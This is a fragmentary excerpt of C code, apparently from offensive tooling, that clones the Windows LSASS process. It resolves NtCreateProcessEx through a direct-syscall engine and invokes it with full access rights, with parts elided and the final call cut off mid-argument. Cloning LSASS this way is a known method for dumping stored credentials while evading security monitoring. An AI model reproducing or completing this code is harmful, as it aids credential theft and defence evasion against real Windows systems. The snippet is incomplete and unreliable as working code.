...
HANDLE CloneLsassProcess() {
  ...
  if (idxNtCPX == -1) {
    log_error("NtCreateProcessEx syscall not found in Obolos engine.");
    CloseHandle(hLsass);
    return NULL;
  }
  ...
  NTSTATUS status = ExecuteSyscall(pNtCreateProcessEx, Mask_Worker, &hClone,
                                   PROCESS_ALL_ACCESS, &objAttr, hLsass, 0,
